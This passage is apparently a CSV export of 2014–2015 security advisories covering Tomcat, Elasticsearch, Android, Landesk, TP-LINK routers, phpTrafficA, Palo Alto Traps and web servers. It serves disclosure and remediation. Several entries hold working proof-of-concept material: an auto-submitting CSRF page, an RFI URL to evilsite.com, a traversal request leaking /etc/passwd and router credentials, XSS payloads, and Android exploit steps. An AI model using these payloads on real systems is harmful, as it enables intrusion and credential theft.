Note that this issue was accidentally disclosed by Red Hat Product
Security on 9 April 2015 [4]. The Tomcat security team was made aware
of this disclosure today (5 May 2015). The information released on 9
April 2015 contained a number of errors. For the sake of clarity:
- - This issue is not limited to file upload. Any request with a body may
be affected.
- - This issue cannot be used to trigger excessive memory usage on the
server. The additional data read from the response body is not
retained - it is simply ignored.
The intention was to embargo this issue until after the 6.0.44
release. Unfortunately that is no longer possible. The Tomcat team is
working on a 6.0.44 release now and we hope to have one available by
early next week.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.9 or later
- - Upgrade to Apache Tomcat 7.0.55 or later
- - Upgrade to Apache Tomcat 6.0.44 or later once released
Credit:
This issue was discovered by AntBean@secdig from the Baidu Security Team
and was reported responsibly to the Apache Tomcat security team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
[4] http://www.openwall.com/lists/oss-security/2015/04/10/1
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQIcBAEBCAAGBQJVSUnRAAoJEBDAHFovYFnnxFgP/38LAZosd36MzvWvBNQSeJmi
QRIm432bbUwVevjVXKKO27oxrL+DUBkesCc0XslGVu0N3gTqzhce2DJXIetpnl04
wV2S88F29jAfRatz65WEbj17gdlP6IobTWzFIyQlfjRxmY97AQQOwRdd/j6P2LMR
vD+thwLccbs9kxTn+MVyQu6W9a1R1Hy3fARdMlfZVchj32jCn3kD37IXF/JLPFso
btBZBt/jEqIb8uq0ZiVUDx5ErvVH5O/AAfxCEh9pfZdl4vIG7SU1KB2iTnyzdat9
Hz0jXc8WFIu3BKY9t2VI/1wUJzGHy8Xzxt4IGjTzy0EQKTI96pXAi6XsQ9AiaHVP
IAtgnEtpjk89qi8YWYoeyLsmpdeUSkCqOTYImn8/2gnrJAtS96SzvE1nBdxpI4O4
f7s2cU4PAnvf9rRvO1SBIb67VYdwB3coAMMtuOodXmjES2xK2xniGVXpIB0RjAyf
/ds/syVsbVZ2LK+LGOsxGR3Rz1dBIanlJ5Tm3fudp9XlfkLhr7Lo04iSRXKDjeIo
ERXDu0zblaMs8KOfP4vg+kAz4Ih86R+vG7xVwQ9Zjoae/t/lAWqwqQeOewC2+esL
qeyZc4J+TO6rcANQ099Iu1iBUN2T3Vd5t7ZPIFDtLSrDVSjnLz6hkltBHBD1lVOl
7nKmBsFyuQyGSHHZ4dN9
=AfA+
-----END PGP SIGNATURE-----"
4850,Elasticsearch vulnerability CVE-2015-3337,,CVE-2015-3337,"Summary:
All Elasticsearch versions prior to 1.5.2 and 1.4.5 are vulnerable to a directory traversal attack that allows an attacker to retrieve files from the server running Elasticsearch. This vulnerability is not present in the initial installation of Elasticsearch. The vulnerability is exposed when a “site plugin” is installed. Elastic’s Marvel plugin and many community-sponsored plugins (e.g. Kopf, BigDesk, Head) are site plugins. Elastic Shield, Licensing, Cloud-AWS, Cloud-GCE, Cloud-Azure, the analysis plugins, and the river plugins are not site plugins.
We have been assigned CVE-2015-3337 for this issue.
Fixed versions:
Versions 1.5.2 and 1.4.5 have addressed the vulnerability.
Remediation:
Users should upgrade to 1.5.2 or 1.4.5. This will address the vulnerability and preserve site plugin functionality.
Users that do not want to upgrade can address the vulnerability in several ways, but these options will break any site plugin:
- Set “http.disable_sites” to true and restart the Elasticsearch node.
- Use a firewall or proxy to block HTTP requests to /_plugin.
- Uninstall all site plugins from all Elasticsearch nodes.
Credit:
John Heasman of DocuSign reported this issue.
CVSS
Overall CVSS score: 4.3"
4916,CVE-2014-7953 Android backup agent code execution,,CVE-2014-7953,"Android backup agent arbitrary code execution
---------------------------------------------
The Android backup agent implementation was vulnerable to privilege
escalation and race condition. An attacker with adb shell access could
run arbitrary code as the system (1000) user (or any other valid
package). The attack is tested on Android OS 4.4.4.
The main problem is inside bindBackupAgent method in the
ActivityManagerService.
This method is exported through Binder and is available to call by the
shell user, since android.permission.BACKUP is granted for it.
The method has an ApplicationInfo parameter, which is unsecured (not
cross validated through the PackageManager), so the uid member could be
manipulated. The supplied ApplicationInfo object will be direct
parameter for startProcessLocked().
Before invoking startProcessLocked, bindBackupAgent also tries to set
stopped state for the package.
This call is bound to an additional permission
(CHANGE_COMPONENT_ENABLED_STATE), which is a system permission, not even
shell user got it.
However, there is a race condition between PackageManager and
ActivityManagerService, so this security check can by bypassed.
Existence of the specified package happens first in
mSettings.setPackageStoppedStateLPw(). If the package does not exists
than IllegalArguemntException is thrown. (Permission would have been
validated as next step only resulting in a SecurityException)
So, if the package does not exists, IllegalArguemntException is thrown,
which is catched by bindBackupAgent, but the execution wont stop (only a
warning is being logged):
// Backup agent is now in use, its package can't be stopped.
try {
AppGlobals.getPackageManager().setPackageStoppedState(
app.packageName, false,
UserHandle.getUserId(app.uid));
} catch (RemoteException e) {
} catch (IllegalArgumentException e) {
Slog.w(TAG, ""Failed trying to unstop package ""
+ app.packageName + "": "" + e);
}
It was possible to perform the following steps in order to exploit:
1. execute ""pm install helloworld.apk"" (with package name
com.example.helloworld)
2. with another script process logcat's output and look for
the dexopt line (DexOpt: load 3ms, verify+opt 5ms, 161068 bytes)
3. trigger execution of the bindBackupAgent system call (with uid
spoofed to 1000 in ApplicationInfo) as soon as the dexopt line was seen
Since this is a race condition and timing is important, it might not
work at first. I was lucky at 3rd attempt.
In this lucky scenario the package did not exists while
setPackageStoppedStateLPw tried to find it, but then it became available
for startPackageLocked.
At this point a new process was forked by the Zygote:
shell@grouper:/ $ ps |grep hello
ps |grep hello
system 6826 141 692340 17312 ffffffff 00000000 S
com.example.helloworld
No code was executed however, since there exists an additional security
check in handleCreateBackupAgent in the ActivityThread:
PackageInfo requestedPackage =
getPackageManager().getPackageInfo(
data.appInfo.packageName, 0, UserHandle.myUserId());
if (requestedPackage.applicationInfo.uid != Process.myUid()) {
Slog.w(TAG, ""Asked to instantiate non-matching package ""
+ data.appInfo.packageName);
return;
}
But the process com.example.helloserver was executed with debug flags
(due to the simple fact that it was built by us and we built it as
debug) so DDMS could be attached to it.
To verify actual code execution, I added
Runtime.getRuntime().exec(""touch /data/app/testSystem"")
as an expression in the debugger to be evaluated by the process.
The command was executed successfully:
shell@grouper:/data/app $ ls -la testSystem
ls -la testSystem
-rw------- system system 0 2014-08-06 01:52 testSystem
13 byte bugfix for all the above in the version control:
https://android.googlesource.com/platform/frameworks/base/+/a8f6d1b%5E!/
Lollipop is not affected, earlier Android versions are.
Tested on: Android 4.4.4:
Reported on: 2014-08-15
Assigned CVE: CVE-2014-7951
Android bug id: 15829193
Discovered by: Imre Rad / Search-Lab Ltd.
http://www.search-lab.hu
http://www.securecodingacademy.com/"
4917,CVE-2014-7951 adb backup archive path traversal file overwrite,,CVE-2014-7951,"ADB backup archive path traversal file overwrite
------------------------------------------------
Using adb one can create a backup of his/her Android device and store it
on the PC. The backup archive is based on the tar file format.
By modifying tar headers to contain ../../ like patterns it is possible
to overwrite files owned by the system user on writeable partitions.
An example pathname in the tar header:
apps/com.android.settings/sp/../../../../data/system/evil.txt
Tar header checksum must be corrected of course.
When restoring the modified archive the BackupManagerService overwrites
the resolved file name, since file name is not sanitized.
Bugfix in the version control:
https://android.googlesource.com/platform/frameworks/base/+/7bc601d%5E!/#F0
Android 5 (Lollipop) and newer versions are not affected (due to the
official bugfix linked above).
Additional conditions for exploiting on pre-Lollipop systems:
- Partition of the desination file must be mounted as writeable (eg.
/system won't work, but /data does)
- It is not possible to overwrite files owned by root, since the process
doing the restore is running as the same user as the package itself and
Android packages cannot run.
- It is not possible to overwrite files owned by system user since AOSP
4.3 due to Id6a0cb4c113c2e4a8c4605252cffa41bea22d8a3, a new hardening
was introduced ""... ignoring non-agent system package "".
(If the operating system is custom and there is a system package
available with a full backup agent specified explicitly, then that
custom Android 4.3 and 4.4 might be affected too.)
Pre 4.3 AOSP systems are affected without further conditions: it is
possible to overwrite files owned by the system user or any other
packages installed on the system.
Tested on: Android 4.0.4:
Reported on: 2014-07-14
Assigned CVE: CVE-2014-7951
Android bug id: 16298491
Discovered by: Imre Rad / Search-Lab Ltd.
http://www.search-lab.hu
http://www.securecodingacademy.com/"
4918,CVE-2014-7954 MTP path traversal vulnerability in Android,,CVE-2014-7954,"MTP path traversal vulnerability in Android 4.4
-----------------------------------------------
doSendObjectInfo() method of the MtpServer class implemented in
frameworks/av/media/mtp/MtpServer.cpp does not validate the name
parameter of the incoming MTP packet at all.
It is possible to upload files outside of the sdcard using a specially
crafted MTP request:
root@testpc:~/mtp-test# ./mtp-mysend sdf.txt
../../../.././../data/data/com.android.providers.media/sdf.txt
libmtp version: 1.1.3
Device 0 (VID=18d1 and PID=4e42) is UNKNOWN.
Please report this VID/PID and the device model to the libmtp
development team
Android device detected, assigning default bug flags
Sending sdf.txt as
../../../../../../data/data/com.android.providers.media/sdf.txt
Sending file...
Progress: 25 of 25 (100%)
New file ID: 203
The file is written by the process com.android.providers.media:
root@grouper:/data/data/com.android.providers.media # ls -la
ls -la
drwxrwx--x u0_a6 u0_a6 2014-07-22 01:06 cache
drwxrwx--x u0_a6 u0_a6 2014-07-22 01:07 databases
lrwxrwxrwx install install 2014-07-22 01:05 lib ->
/data/app-lib/com.android.providers.media
-rw-rw-r-- u0_a6 media_rw 13 2014-09-24 01:36 sdf.txt
drwxrwx--x u0_a6 u0_a6 2014-07-22 01:06 shared_prefs
Tested on: Android 4.4.4
Reported on: 2014-09-26
Assigned CVE: CVE-2014-7954
Discovered by: Imre Rad / Search-Lab Ltd.
http://www.search-lab.hu
http://www.securecodingacademy.com/"
4923,[CVE-2014-5361][CVE-2014-5362]Landesk Management Suite RFI & CSRF Security Vulnerabilities,,CVE-2014-5361,"Exploit Title: Landesk Management Suite RFI and CSRF vulnerabilities
Product: Landesk Management Suite
Vulnerable Versions: 9.5 (and possible previous versions), 9.6
Tested Version: 9.5
Advisory Publication: 16/04/2015
Latest Update: 16/04/2015
Vulnerability Type: Cross-site request forgery [CWE-352], Remote File Inclusion [CWE-829]
CVE Reference: CVE-2014-5361, CVE-2014-5362
Credit: Alex Haynes
Advisory Details:
(1) Vendor & Product Description
--------------------------------
Vendor:
LANDESK
Product & Version:
Landesk Management Suite v9.5
Vendor URL & Download:
http://www.landesk.com/products/management-suite/
Product Description:
""Manage all your users� multi-platform desktops and mobile devices. Integrate several IT disciplines
into a single management experience that speeds software distribution, ensures software license compliance,
simplifies OS provisioning, saves power costs, provides secure remote control, and manages Mac OS X.""
(2) Vulnerability Details:
--------------------------
The admin interface of Landesk Management Suite can be exploited by Remote File Inclusion (RFI) and Cross-site Request forgery (CSRF) attacks.
Proof of concept for CSRF [CVE-2014-5361]:
-----------------------------------------
URL: https://<LANDESK>/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT
Attack Pattern:
Certain functionalities of landesk are vulnerable to cross-site request forgeries, which can be used to force users to, among other things,
manipulate windows services and processes on host machines.
Example code below:
<!-- CSRF for Landesk, allowing stop, start or restart of arbitrary services OR processes on host machine -->
<html>
<head>
<script>
<!-- For illustration only, Skype and Adobe Acrobat Update Services are shut down / Replace with any windows service on host machine -->
window.onload = function() {
document.getElementById(""csrfForm1"").submit();
document.getElementById(""csrfForm2"").submit();
}
</script>
</head>
<body>
<form id=""csrfForm1"" action=""https://landesk/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT"" method=""POST"" enctype=""multipart/form-data"" target=""csrfIframe1"">
<input type=""hidden"" name=""op"" value=""stop"" />
<input type=""hidden"" name=""name"" value=""Adobe Acrobat Update Service"" />
</form>
<form id=""csrfForm2"" action=""https://landesk/remote/serverServices.aspx?cidn=5&d=serverServices&tb=serverInfo_services.tb&gid=groupSW_Services&itemid=SW_Services&UID=SW_Services_SW_ROOT"" method=""POST"" enctype=""multipart/form-data"" target=""csrfIframe2"">
<input type=""hidden"" name=""op"" value=""stop"" />
<input type=""hidden"" name=""name"" value=""Skype Updater"" />
</form>
<iframe style=""display:hidden"" height=""0"" width=""0"" frameborder=""0"" name""csrfIframe1""></iframe>
<iframe style=""display:hidden"" height=""0"" width=""0"" frameborder=""0"" name""csrfIframe2""></iframe>
</body>
</html>
Proof of concept for RFI [CVE-2014-5362]:
-----------------------------------------
There are numerous URLs within the landesk management suite that can be used to call upon remote files due to the use of relative paths.
This can be leveraged to introduce remote file inclusion vulnerabilities as you can present external content through the landesk server.
URLs:
https://<LANDESK>/ldms/sm_actionfrm.asp?cmd=dir&ht=1&d=//<RFI here>
https://<LANDESK>/remote/frm_coremainfrm.aspx?tb=cust_qry.tb&d=//<RFI here>&bfn=swd_top&node=4&baseType=group1&groupID=1646&groupType=null&ownerID=56
https://<LANDESK>/remote/frm_splitfrm.aspx?top=//<RFI here>&ttb=dirman.tb&ftr=frm_tasktabsfrm&tabf=dirman_tabs&tf=dirman_top&bottom=frm_taskfrm&bbd=SoftwareDistribution/ldaplist&bf=dirlist_bottom&bd=frm_coremainfrm&btb=dirlist.tb&pct=50
Parameter names: ""d"" & ""top""
Parameter Type: GET
Attack Pattern:
The Remote File must finish in .aspx but the extension is not referenced explicitly in the URL. It will be fetched in HTTPS.
d=//<any external URL here>/<filenamehere>(.aspx)
example:
https://<LANDESK>/ldms/sm_actionfrm.asp?cmd=dir&ht=1&d=//evilsite.com/myevilaspxfile
(3) Advisory Timeline:
----------------------
15/09/2014 - First Contact
23/10/2014 - Request for update on fix. No ETA given.
21/11/2014 - Request for update on fix. No ETA given.
22/12/2014 - Request for update on fix. No ETA given.
22/01/2015 - Request for update on fix. No ETA given.
13/04/2015 - Final request for update and notice of public disclosure given. No ETA for fix.
16/04/2015 - Public disclosure
(4)Solution:
------------
No fix at this time.
(5) Credits:
------------
Discovered by Alex Haynes
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5361
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5362
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5361
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5362"
4957,SEC Consult SA-20150410-0 :: Unauthenticated Local File Disclosure in multiple TP-LINK products (CVE-2015-3035),,CVE-2015-3035,"SEC Consult Vulnerability Lab Security Advisory < 20150410-0 >
=======================================================================
title: Unauthenticated Local File Disclosure
product: Multiple TP-LINK products (see Vulnerable / tested versions)
vulnerable version: Multiple (see Vulnerable / tested versions)
fixed version: see Solution
CVE number: CVE-2015-3035
impact: Critical
homepage: http://tp-link.com
found: 2015-02-19
by: Stefan Viehböck (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Berlin - Frankfurt/Main - Montreal - Singapore
Vienna (HQ) - Vilnius - Zurich
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
""TP-LINK is a global provider of SOHO & SMB networking products and the World's
No.1 provider of WLAN products, with products available in over 120 countries
to tens of millions customers. Committed to intensive R&D, efficient production
and strict quality management, TP-LINK continues to provide award-winning
networking products in Wireless, ADSL, Routers, Switches, IP Cameras, Powerline
Adapters, Print Servers, Media Converters and Network Adapters for Global
end-users.""
Source: http://www.tp-link.us/about/?categoryid=102
Business recommendation:
------------------------
Attackers can read sensitive configuration files without prior authentication.
These files e.g. include the administrator credentials and the WPA passphrase.
TP-LINK has provided fixed firmware which should be installed immediately.
Vulnerability overview/description:
-----------------------------------
Because of insufficient input validation, arbitrary local files can be
disclosed. Files that include passwords and other sensitive information can
be accessed.
Proof of concept:
-----------------
The following HTTP request shows how directory traversal can be used to gain
access to files without prior authentication:
===============================================================================
GET /login/../../../etc/passwd HTTP/1.1
Host: $host
===============================================================================
The server response includes the contents of the file:
===============================================================================
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm=""TP-LINK Wireless Dual Band Gigabit Router WDR4300""
Content-Length: 683
Content-Type: text/html
root:x:0:0:root:/root:/bin/sh
Admin:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/usr/sbin:/bin/sh
adm:x:3:4:adm:/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/bin:/bin/sync
shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:Operator:/var:/bin/sh
nobody:x:65534:65534:nobody:/home:/bin/sh
ap71:x:500:0:Linux User,,,:/root:/bin/sh
dropbear:x:500:500:dropbear:/tmp/dropbear:/bin/sh
admin:x:500:500:admin:/home:/bin/sh
guest:x:500:500:guest:/home:/bin/sh
dropbear:x:500:500:dropbear:/tmp/dropbear:/bin/sh
dropbear:x:500:500:dropbear:/tmp/dropbear:/bin/sh
===============================================================================
Several sensitive files can be read. These include:
Files containing Wi-Fi configuration including WPA-passphrase:
/login/../../../tmp/ath.ap_bss
/login/../../../tmp/ath1.ap_bss
A file containing administrator credentials (format: $user:md5($password), which can
be brute-forced very efficiently:
/login/../../../tmp/dropbear/dropbearpwd
Example server response:
===============================================================================
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm=""TP-LINK Wireless Dual Band Gigabit Router WDR4300""
Content-Length: 56
Content-Type: text/html
username:admin
password:11d0fc2ff3e7862d8a3f9b280e6d390c
===============================================================================
Vulnerable / tested versions:
-----------------------------
The vulnerability affects the following products:
TP-LINK Archer C5 (Hardware version 1.2)
TP-LINK Archer C7 (Hardware version 2.0)
TP-LINK Archer C8 (Hardware version 1.0)
TP-LINK Archer C9 (Hardware version 1.0)
TP-LINK TL-WDR3500 (Hardware version 1.0)
TP-LINK TL-WDR3600 (Hardware version 1.0)
TP-LINK TL-WDR4300 (Hardware version 1.0)
TP-LINK TL-WR740N (Hardware version 5.0)
TP-LINK TL-WR741ND (Hardware version 5.0)
TP-LINK TL-WR841N (Hardware version 9.0)
TP-LINK TL-WR841N (Hardware version 10.0)
TP-LINK TL-WR841ND (Hardware version 9.0)
TP-LINK TL-WR841ND (Hardware version 10.0)
Vendor contact timeline:
------------------------
2015-02-19: Contacting vendor through support tp-link com.
2015-02-24: Resending email as previous ticket has been closed by TP-LINK.
2015-02-24: Contacting technical support engineer of TP-LINK, contact received
by 3rd party.
2015-02-25: Requesting encryption keys, providing affected models.
2015-02-26: No encryption keys available, sending advisory in unencrypted form.
2015-02-28: Vendor confirms vulnerability, provides beta firmware.
2015-03-03: Sending confirmation that beta firmware fixes the vulnerability.
2015-03-06: Vendor is working on release schedule, affected devices.
2015-03-16: Vendor announces that fixed firmware will be released by the end of
March.
2015-03-24: Vendor confirms that firmware releases are on schedule.
2015-04-08: Vendor provides final list of affected products & download URLs.
2015-04-10: Coordinated release of security advisory.
Solution:
---------
Update to the most recent firmware version:
TP-LINK Archer C5 (Hardware version 1.2): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13048
TP-LINK Archer C7 (Hardware version 2.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13008
TP-LINK Archer C8 (Hardware version 1.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13052
TP-LINK Archer C9 (Hardware version 1.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13020
TP-LINK TL-WDR3500 (Hardware version 1.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13018
TP-LINK TL-WDR3600 (Hardware version 1.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13019
TP-LINK TL-WDR4300 (Hardware version 1.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13009
TP-LINK TL-WR740N (Hardware version 5.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13012
TP-LINK TL-WR741ND (Hardware version 5.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13013
TP-LINK TL-WR841N (Hardware version 9.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13033
TP-LINK TL-WR841N (Hardware version 10.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13036
TP-LINK TL-WR841ND (Hardware version 9.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13035
TP-LINK TL-WR841ND (Hardware version 10.0): http://www.tp-link.com/en/handlers/download.ashx?resourceid=13037
Workaround:
-----------
See solution.
Advisory URL:
-------------
https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC Consult Vulnerability Lab
SEC Consult
Berlin - Frankfurt/Main - Montreal - Singapore - Vienna (HQ) - Vilnius - Zurich
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/Career.htm
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF Stefan Viehböck / @2015"
4975,[CVE-2015-2926] XSS vuln in phpTrafficA,,CVE-2015-2926,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Product: phpTrafficA
Product page: http://soft.zoneo.net/phpTrafficA/
Affected versions: Up to and including 2.3 (latest as of writing).
Description:
The user agent string provided by the browser is not sanitized nor
escaped when handled. This string is then outputting into HTML code on
the ""Latest visitors > Details"" page, leading to HTML injection that can
be abused to perform XSS. For example, the following user agent will
cause a JavaScript dialogbox to pop up as soon as the page is visited:
""><script>alert();</script>
This page can be hidden from the public, in which case only admins can
visit it. However, the script still executes when they do, which could
enable a malicious user agent to steal the phpTrafficA cookie (no
expiry) or other admin credentials.
Proposed fix:
Escape the HTML characters with htmlspecialchars before outputting the
user agent string.
In: Php/stats/statsRecent.inc.php
Line 304:
echo ""<tr class=""data av $even $clrobots $clreturn""><td
nowrap>$end</td><td>&nbsp;$dur</td><td
align=""center"">&nbsp;"".format_float($hits).""&nbsp;</td><td>&nbsp;<a
href=""./index.php?mode=stats&amp;sid=$sid&amp;show=clickstream&amp;lang=$lang&amp;ip=$ip""
title="""".$strings['Moreinfovisitor'].""""
class=""basic"">$ipText</a>&nbsp;</td><td
align=""center"">&nbsp;"".format_float($visits).""&nbsp;</td><td>"".countryFlag($country).""</td><td>"".osImg($os,'').""</td><td>"".browserImg($wb,$agent).""</td><td>$page</td><td>$refString</td></tr> "";
becomes:
echo ""<tr class=""data av $even $clrobots $clreturn""><td
nowrap>$end</td><td>&nbsp;$dur</td><td
align=""center"">&nbsp;"".format_float($hits).""&nbsp;</td><td>&nbsp;<a
href=""./index.php?mode=stats&amp;sid=$sid&amp;show=clickstream&amp;lang=$lang&amp;ip=$ip""
title="""".$strings['Moreinfovisitor'].""""
class=""basic"">$ipText</a>&nbsp;</td><td
align=""center"">&nbsp;"".format_float($visits).""&nbsp;</td><td>"".countryFlag($country).""</td><td>"".osImg($os,'').""</td><td>"".browserImg($wb,htmlspecialchars($agent)).""</td><td>$page</td><td>$refString</td></tr> "";
Line 369:
$echo = ""<tr><td valign=""top"" colspan=""3"">$ip
($whoislink$baniplink)<br>$host<br>$labelTxt<table
class=""basic""><tr><td>"".countryNameFlag($country).""</td></tr></table></td><td
valign=""top"" colspan=""2"">"".$strings['Agent']."": $thisagent<br><table
class=""basic""><tr><td>"".osImgName($os).""</td><td>"".browserImgName($wb).""</td></tr></table>"".$strings['Referrer']."":
"";
becomes:
$echo = ""<tr><td valign=""top"" colspan=""3"">$ip
($whoislink$baniplink)<br>$host<br>$labelTxt<table
class=""basic""><tr><td>"".countryNameFlag($country).""</td></tr></table></td><td
valign=""top"" colspan=""2"">"".$strings['Agent']."":
"".htmlspecialchars($thisagent).""<br><table
class=""basic""><tr><td>"".osImgName($os).""</td><td>"".browserImgName($wb).""</td></tr></table>"".$strings['Referrer']."":
"";
Best regards,
Daniel Geerts
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.22 (Darwin)
Comment: GPGTools - https://gpgtools.org
iQIcBAEBCgAGBQJVJPGzAAoJEHn1bVIKHk5N5egP/0FRgNCiTwYyFwmqgcNLxOQ5
yuJtnGdGFvH0axXlvm+AgVYOtmM4erduSR3hCaSx4ER7f30SZkRCUuaW8aR1/Tow
bdYzLXNHcY21gXkhHt+bWH7ZkEpUWxXR6ZzrwL5QO3Ez+QkDr1HUmg8QQPUia8Qk
KGY+dbkRXqVR7MYRGjAbyceOEXpxpOtxaZ9UTSmQTGW31Upu+dmqkkOTbvV20tEj
N07T4UwMffCGNWloeuXg8QvIlvwe22kV3+frA2qGxdWKHVl66iJAV0pQ+bxDgoxe
Y3JsYKdeIhB6T0Yt7rpEbzlgaupQ9pg279bzGVVD4Z+AuNhvDY/4K6RZsFB11DGv
eY4VR8KLyNuw5N/wLBGf9ZSL9dLBGatYxi0HoQtrmFqLppo1x6nhEV6A0gRulWRa
9L04PdWKmv+2/prwW9ygT7UFIdApT1q3Uljq9QQIWmdDxGx3YxFmvMVpC5NThtxO
ElN8fhQpUKFss439qiLaGEMKO/D4bNC71Ydo6jvZOWQ+9eBxmMUT7XfK6fnB811c
RTRON1SG73AWcbfpIJ/dM+g0jm6bcvVVQxNmaARdlf+E2ihXnMPU2k39ndfV/vqD
7iuZQraH1ZrQJAqjVmzHWvEfEPyeaiJPRguu1kmnG8QkSMDtBHIpGvvHCHSU4ioF
+wxMYqlgbfJGakc4s5RO
=wCVy
-----END PGP SIGNATURE-----"
4984,CVE-2015-1773 Apache Flex reflected XSS vulnerability,,CVE-2015-1773,"CVE-2015-1773 Apache Flex reflected XSS vulnerability
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
All versions of Apache Flex before 4.14.1
Description:
The asdoc tool produced JavaScript code that was vulnerable to a reflected XSS attack. A request with a specially crafted URL could execute malicious JavaScript in the user's web browser. The attacker would have to convince the user to click the attacker's crafted link.
This only affects the output of the 'asdoc' tool, not the output of the 'mxmlc' compiler or deployed Apache Flex applications.
Mitigation:
Users should upgrade to the most recent version of Apache Flex and regenerate any local files produced by the asdoc tool.
If you have made local modifications to the asdoc index.html file, such as altering the TITLE tags, you will need to make sure these are preserved.
Alternatively, apply the following changes to any already generated asdoc index.html files, as well as to the file
asdoc/templates/index.html in any older Apache Flex SDKs
http://bit.ly/apache-flex-asdoc-fix
Credit:
Thanks to Radjnies Bhansingh of Securify BV for reporting this issue.
Tom Chiverton
Apache Flex PMC"
5060,CVE-2015-2223: Palo Alto Traps Server Stored XSS,,CVE-2015-2223,"------------------------------------------------------------------------
Product: Palo Alto Traps Server (formerly Cyvera Endpoint Protection)
Vendor: Palo Alto Networks
Vulnerable Version(s): 3.1.2.1546
Tested Version: 3.1.2.1546
Advisory Publication: 29 March 2015
Vendor Notification: 17 October 2014
Vulnerability Type: Stored Cross Site Scripting
CVE Reference: CVE-2015-2223
Risk Level: High
Solution Status:
Discovered and Provided: Michael Hendrickx, help AG
------------------------------------------------------------------------
About the product:
Palo Alto Traps is an advanced endpoint protection suite that detects attacks such as memory corruption, executable child processes, DLL hijacking, etc. Aside from optionally blocking it, it sends this �trap� to a central server for logging purposes.
About the vulnerability:
An attacker can send a SOAP request with JavaScript embedded inside it, which gets stored in the database. When an administrator monitors the Traps� admin screen and opens details about the vulnerability, the JavaScript is executed on the admin browser.
The XSS works in the <b:Arguments>, <b:FileName> and <b:URL> parameters, for example:
<b:Arguments>""C:\Users\Michael\fake.exe""
&#0000060;script&#0000062;
alert(""xss"");
&#0000060;/script&#0000062;
</b:Arguments>
A POC script can be found at the following URL:
https://github.com/ndrix/random-scripts/blob/master/pa_traps_xss.rb
------------------------------------------------------------------------
Solution:
The vendor was notified back in October 2014, and a we�ve sent a few follow ups since. Contact the vendor for the patch details.
References:
[1] help AG middle East: http://www.helpag.com/
[2] Palo Alto Traps: https://www.paloaltonetworks.com/products/endpoint-security.html
------------------------------------------------------------------------"
5144,Advisory: CVE-2014-9708: Appweb Web Server,,CVE-2014-9708,"Affected software: Appweb Web Server
CVE ID: CVE-2014-9708
Description: An HTTP request with a Range header of the form ""Range:
x=,"" (ie. with an empty range value) will cause a null pointer
dereference, leading to a remotely-triggerable DoS.
Fixed versions: 4.6.6, 5.2.1
Bug entry: https://github.com/embedthis/appweb/issues/413
Fix: https://github.com/embedthis/appweb/commit/7e6a925f5e86a19a7934a94bbd6959101d0b84eb#diff-7ca4d62c70220e0e226e7beac90c95d9L17348
Reported by: Matthew Daley
- Matthew Daley"
5145,Advisory: CVE-2014-9707: GoAhead Web Server 3.0.0 - 3.4.1,,CVE-2014-9707,"Affected software: GoAhead Web Server
Affected versions: 3.0.0 - 3.4.1 (3.x.x series before 3.4.2)
CVE ID: CVE-2014-9707
Description: The server incorrectly normalizes HTTP request URIs that
contain path segments that start with a ""."" but are not entirely equal
